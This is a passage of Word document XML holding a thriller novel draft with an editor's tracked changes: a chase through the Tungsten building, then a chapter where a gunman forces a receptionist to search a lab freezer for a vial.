      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">attacker. </w:t>
      </w:r>
      <w:ins w:id="1116" w:author="TextVet" w:date="2016-03-17T14:49:00Z">
        <w:r w:rsidR="00052AB1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Roaring</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1117" w:author="TextVet" w:date="2016-03-17T14:49:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00052AB1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>He let out a mighty yell</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:ins w:id="1118" w:author="TextVet" w:date="2016-03-17T14:49:00Z">
        <w:r w:rsidR="00052AB1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>he</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1119" w:author="TextVet" w:date="2016-03-17T14:49:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00052AB1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>and</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> threw himself at the figure in the dark.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Somewhere underneath the din of his heartbeat and his own battle</w:t>
      </w:r>
      <w:ins w:id="1120" w:author="TextVet" w:date="2016-03-17T14:50:00Z">
        <w:r w:rsidR="00180071">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1121" w:author="TextVet" w:date="2016-03-17T14:50:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00180071">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cry, he heard Mike’s voice yell, “Danny!” The voice didn’t come through a cellphone, but from the figure in front of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stopped in mid-lunge</w:t>
      </w:r>
      <w:ins w:id="1122" w:author="TextVet" w:date="2016-03-17T14:51:00Z">
        <w:r w:rsidR="00F44DE6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1123" w:author="TextVet" w:date="2016-03-17T14:51:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F44DE6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> as</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="1124" w:author="TextVet" w:date="2016-03-17T14:51:00Z">
        <w:r w:rsidR="00F44DE6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">shards of </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">recognition </w:t>
      </w:r>
      <w:ins w:id="1125" w:author="TextVet" w:date="2016-03-17T14:51:00Z">
        <w:r w:rsidR="00F44DE6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>jangling</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1126" w:author="TextVet" w:date="2016-03-17T14:51:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F44DE6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>came to him</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> through his combat panic.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Danny said, so relieved he almost started laughing. “I am so fucking happy to see you right now.” His head swirled as the adrenaline </w:t>
      </w:r>
      <w:ins w:id="1127" w:author="TextVet" w:date="2016-03-17T14:52:00Z">
        <w:r w:rsidR="006B232F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>subsid</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1128" w:author="TextVet" w:date="2016-03-17T14:52:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006B232F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>fad</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ed</w:t>
      </w:r>
      <w:del w:id="1129" w:author="TextVet" w:date="2016-03-17T14:52:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006B232F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> away</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. He was safe.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retrieved his cellphone from the hallway floor. His gun was a little banged up — the power converter had gotten dented</w:t>
      </w:r>
      <w:ins w:id="1130" w:author="TextVet" w:date="2016-03-17T14:53:00Z">
        <w:r w:rsidR="000C4A29">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>;</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1131" w:author="TextVet" w:date="2016-03-17T14:53:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000C4A29">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the row of relays had come loose from their Velcro moorings — but there didn’t seem to be any functional damage.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conference call, Jason asked, “Are you guys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Danny said, dizzy. “I think I landed wrong on my shoulder. Stings a little.” He rolled his left arm around. “Seems to be okay</w:t>
      </w:r>
      <w:ins w:id="1132" w:author="TextVet" w:date="2016-03-17T14:53:00Z">
        <w:r w:rsidR="00292E7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though. No time to rest; we’ve got to get to that freezer room. This next part’s going to be tricky…”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was thinking about that, Danny,” said Jason. “You might want to grab a lab coat, if you see one. And a facemask. That way, you’ll</w:t>
      </w:r>
      <w:commentRangeStart w:id="1133"/>
      <w:ins w:id="1134" w:author="TextVet" w:date="2016-03-17T14:56:00Z">
        <w:r w:rsidR="00516935">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>—</w:t>
        </w:r>
        <w:commentRangeEnd w:id="1133"/>
        <w:r w:rsidR="00516935">
          <w:rPr>
            <w:rStyle w:val="CommentReference"/>
          </w:rPr>
          <w:commentReference w:id="1133"/>
        </w:r>
      </w:ins>
      <w:del w:id="1135" w:author="TextVet" w:date="2016-03-17T14:56:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00516935">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words were muffled by a low, thundering boom that resounded through the building. The echoes of a distant explosion rumbled down Tungsten’s corridors, permeating the walls and flooding the rooms like a thick clear syrup of sound.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“Camera crew!” Danny gasped. “What the hell was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replied, “That was the other guy’s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one that’s pointed at the girl?” Danny asked with renewed panic.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tried to fight back,” Moshen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gasped. “Is she…”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“Get your butts over there,” Moshen directed.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gulped, and exchanged a nod with Mike.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00830F99" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:ins w:id="1136" w:author="TextVet" w:date="2016-03-17T14:59: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t</w:t>
      </w:r>
      <w:ins w:id="1137" w:author="TextVet" w:date="2016-03-17T14:58:00Z">
        <w:r w:rsidR="00066C48">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>he pair</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1138" w:author="TextVet" w:date="2016-03-17T14:58:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00066C48">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>wo men set off through</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1139" w:author="TextVet" w:date="2016-03-17T14:58:00Z">
        <w:r w:rsidR="00066C48">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r w:rsidR="0036393C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">began </w:t>
        </w:r>
        <w:r w:rsidR="00066C48">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>negotiat</w:t>
        </w:r>
        <w:r w:rsidR="0036393C">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the dim corridors, Danny’s fingers twitched, subconsciously reaching for Control-S on a nonexistent keyboard. He caught himself glancing into rooms</w:t>
      </w:r>
      <w:ins w:id="1140" w:author="TextVet" w:date="2016-03-17T14:59:00Z">
        <w:r w:rsidR="004132D0">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craving the sight of a prominently placed typewriter like in </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Resident Evil</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, or a pink audiocassette like in </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Grand Theft Auto: Vice City</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, or perhaps just a glowing red square like in </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Silent Hill 2</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">.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he knew that, on this level, he would find no save-points.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00F62BCE">
      <w:pPr>
        <w:pStyle w:val="ChapterNum"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>11</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“I n-need you b-be more s-piffic,”</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> Tina stammered through her shivering jaw as she closed the massive metal door yet again. Inside the ultra-low freezer were half a dozen rack shelves. Each shelf held a dozen lunchbox-shaped cases made of metal and Styrofoam. Inside each case were two dozen vials, each no bigger than a finger. And one of these vials was the one that the man with the gun wanted.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sat on a desk between her and the exit. “I already told you</w:t>
      </w:r>
      <w:ins w:id="1141" w:author="TextVet" w:date="2016-03-17T15:01:00Z">
        <w:r w:rsidR="009E7833">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1142" w:author="TextVet" w:date="2016-03-17T15:01:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="009E7833">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>. It’s a</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> small</w:t>
      </w:r>
      <w:ins w:id="1143" w:author="TextVet" w:date="2016-03-17T15:01:00Z">
        <w:r w:rsidR="002D7E3D">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clear plastic snap-top tube with cone-shaped bottom.” He absentmindedly kept his revolver pointed at her, his attention divided between her and his cellphone.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just described </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>every</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> vial in there,” </w:t>
      </w:r>
      <w:del w:id="1144" w:author="TextVet" w:date="2016-03-17T15:03:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="007D0311">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>s</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>he</w:t>
      </w:r>
      <w:ins w:id="1145" w:author="TextVet" w:date="2016-03-17T15:03:00Z">
        <w:r w:rsidR="007D0311">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>r jaw</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="1146" w:author="TextVet" w:date="2016-03-17T15:03:00Z">
        <w:r w:rsidR="007D0311">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>juddere</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1147" w:author="TextVet" w:date="2016-03-17T15:03:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="007D0311">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 xml:space="preserve">d, blowing into </w:t>
      </w:r>
      <w:del w:id="1148" w:author="TextVet" w:date="2016-03-17T15:04:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00805DBD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">the </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>thick black acrylic gloves that protected her fingers from frostbite.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Ignoring her, the man tapped his Bluetooth headset. “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Allyo? Allyo, Leonya? Gdyeti, durak?</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 everything okay?” she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“My partner isn’t…” he started, then cut himself off. “Isn’t your business. Where is that fucking tube?”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have no idea,” Tina said. “All these vials look exactly the same. How did you expect to know which one’s the right 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Still jabbing at his phone, he replied, “There is sticker on the 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w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>all</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> have a sticker on the side,” she insisted. “That’s how they’re labeled.”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 your problem now. Figure it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On a metal table in the center of the room stood a case from the deep-freezer. Its hinged top gaped open, revealing a grid of empty circular holes in a Styrofoam interior. Beside the case lay a series of snap-top test tubes, their caps rimmed with frost. Their </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>translucent walls revealed a pasty yellowish-brown goop. Each tube bore a rectangular white label along its side, with handwritten identifiers.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don’t know what you want me to do!” Tina pleaded. “Look, I’m just the receptionist, okay? Tungsten does </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>not</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> pay me enough for this. How about I </w:t>
      </w:r>
      <w:ins w:id="1149" w:author="TextVet" w:date="2016-03-17T15:07:00Z">
        <w:r w:rsidR="00FD63DB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>j-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>just walk out of here, get my purse from my desk, drive off, and we’ll both say none of this ever happened? I won’t call the cops, or remember your face. Okay? Please, I swear to God, I want nothing to do with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looked up from his phone, glaring. “Be useful!” he growled. “You know what happens if you are not useful?”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shivered, but not from the cold.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turned to the table with resignation. One by one, she picked up the tiny vials and put them back into the case, taking care to slide each one into the exact little round Styrofoam hole from whence it came. When the last of the two dozen vials had been returned, she sealed the case’s metal lid and lifted it in one hand by a carrying strap. With her other</w:t>
      </w:r>
      <w:del w:id="1150" w:author="TextVet" w:date="2016-03-17T15:08:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00DC0EC4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> hand</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, she grabbed the lever-like handle of the cryogenic storage unit. The freezer was attached to a monitoring terminal, a small</w:t>
      </w:r>
      <w:ins w:id="1151" w:author="TextVet" w:date="2016-03-17T15:08:00Z">
        <w:r w:rsidR="00193D9B">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ancient dirty beige computer with a thick clunky keyboard, which kept track of the environment inside the freezer. “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>TEMPERATURE: 200.7K -72.4oC -98.3oF</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>”, its screen reported in blocky green letters. Tina winced.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I at least borrow your jacket?” she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“My jacket? Lady, this is Italian custom-made lambskin leather.”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body shivered preemptively. A yank of the handle released the cryogenic storage unit’s seal, and she again found herself standing in a pale cloud of stabbing cold mist. The freezer’s loud pumps whirred to keep the interior frigid in spite of the open door, and the monitoring terminal’s readout fluctuated. Working as quickly as her shaking body would allow, Tina slid the case back into its place upon the freezer’s rime-coated racks. She then grabbed the strap of the next identical case on the shelf, pulled it out, and slammed the freezer door shut.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Back at the metal table, she popped open the lid of the new case and began pulling out vials, struggling to catch the lip of each snap-top tube with the fingertips of the </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>glove. She examined each label carefully before laying the vial</w:t>
      </w:r>
      <w:ins w:id="1152" w:author="TextVet" w:date="2016-03-17T15:10:00Z">
        <w:r w:rsidR="00C441DA">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 xml:space="preserve"> on the table in a neat row</w:t>
